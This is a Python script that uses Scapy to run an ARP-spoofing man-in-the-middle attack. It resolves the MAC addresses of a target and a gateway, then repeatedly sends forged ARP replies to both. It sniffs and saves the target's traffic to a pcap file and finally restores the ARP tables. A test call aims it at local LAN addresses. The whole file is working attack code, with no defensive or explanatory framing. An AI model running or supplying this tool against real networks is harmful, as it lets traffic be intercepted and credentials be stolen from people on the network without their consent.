from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
from colorama import Fore, Back, Style
import os
import sys
import subprocess
import time

# If not sudo, don't allow to continue
if not 'SUDO_UID' in os.environ.keys():
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
        sys.exit()
        
def getmac(target_ip):

    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst = target_ip)
    resp, _ = srp(packet, timeout = 2, retry = 10, verbose = False)
    for _, r in resp:
        return(r[Ether].src.upper())
    return None

class Arper:

    def __init__(self, target, gateway, iface, count):
        self.poison_thread = Process(target=self.poison)
        self.sniff_thread = Process(target=self.sniff)
        
        self.count = count
        self.target = target
        self.targetmac = getmac(target)
        self.gateway = gateway
        self.gatewaymac = getmac(gateway)
        self.iface = iface

        conf.iface = iface
        conf.verb = 0

        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Interface: {Fore.GREEN}{iface}{Style.RESET_ALL}')  
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Target ({Fore.YELLOW}{target}{Style.RESET_ALL}) MAC: {Fore.GREEN}{self.targetmac}{Style.RESET_ALL}')  
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Gateway ({Fore.YELLOW}{gateway}{Style.RESET_ALL}) MAC: {Fore.GREEN}{self.gatewaymac}{Style.RESET_ALL}\n') 

    def run(self):
        try:
            self.poison_thread.start()
            self.sniff_thread.start()

        except Exception as e:
            print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
            self.poison_thread.terminate() ###
            self.sniff_thread.terminate() ###
            sys.exit()

        except KeyboardInterrupt:
            pass

    def poison(self):
        
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway
        poison_target.pdst = self.target
        poison_target.hwdst = self.targetmac

        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] IP Source: {Fore.GREEN}{poison_target.psrc}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] IP Destination: {Fore.GREEN}{poison_target.pdst}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] MAC Destination: {Fore.GREEN}{poison_target.hwdst}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] MAC Source: {Fore.GREEN}{poison_target.hwsrc}{Style.RESET_ALL}\n')

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] IP Source: {Fore.GREEN}{poison_gateway.psrc}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] IP Destination: {Fore.GREEN}{poison_gateway.pdst}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] MAC Destination: {Fore.GREEN}{poison_gateway.hwdst}{Style.RESET_ALL}')
        print(f'[{Fore.GREEN}+{Style.RESET_ALL}] MAC Source: {Fore.GREEN}{poison_gateway.hwsrc}{Style.RESET_ALL}\n')

        print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Starting ARP poisoning...')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_target) ###
                send(poison_gateway) ###
                time.sleep(2)
                
            except Exception as e:
                print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')

                self.poison_thread.terminate() ###
                self.sniff_thread.terminate() ###   
                sys.exit()

            except KeyboardInterrupt:
                pass

    def sniff(self):

        try:
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit()

        filename = f'arper-{self.target}-{self.gateway}.pcap'

        if self.count == 0:
            print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Sniffing packets indefinitely...')
        else:
            print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Sniffing {self.count} packets...')

        try:     
            bpf_filter = 'ip host %s' % self.target
            packets = sniff(count=self.count, filter=bpf_filter, iface=self.iface) ###

        except Exception as e:
            print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')

            self.poison_thread.terminate() ###
            self.sniff_thread.terminate() ### 
            
            sys.exit()

        except KeyboardInterrupt:
            if self.count == 0:
                sys.exit()
            else:
                pass
        
        else:
            wrpcap(filename, packets)
            print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Packets captured and saved in {Fore.GREEN}{filename}{Style.RESET_ALL}.')
            self.restore()
            print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Sniffing finnished succesfully.')
            self.poison_thread.terminate() ###
            
            

    def restore(self):

        print('Test: entered restore func succesflly') ### testing

        print(f'\n[{Fore.YELLOW}?{Style.RESET_ALL}] Restoring ARP tables...')

        try:
            send(ARP(op = 2, psrc = self.gateway, hwsrc = self.gatewaymac, pdst = self.target, hwdst = 'ff:ff:ff:ff:ff:ff'), count = 5)
            send(ARP(op = 2, psrc = self.target, hwsrc = self.targetmac, pdst = self.gateway, hwdst = 'ff:ff:ff:ff:ff:ff'), count = 5)
        
        except Exception as e:
            print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
            sys.exit()

        except KeyboardInterrupt:
            pass

        else:
            print(f'[{Fore.GREEN}+{Style.RESET_ALL}] ARP tables restored.')
            self.poison_thread.terminate() ###


def arpspoof(target, gateway, iface, count=0):

    arp = Arper(target, gateway, iface, count)
    arp.run()

if __name__ == '__main__': # for test
    arpspoof('192.168.1.241', '192.168.1.2', 'wlp1s0', 100)
   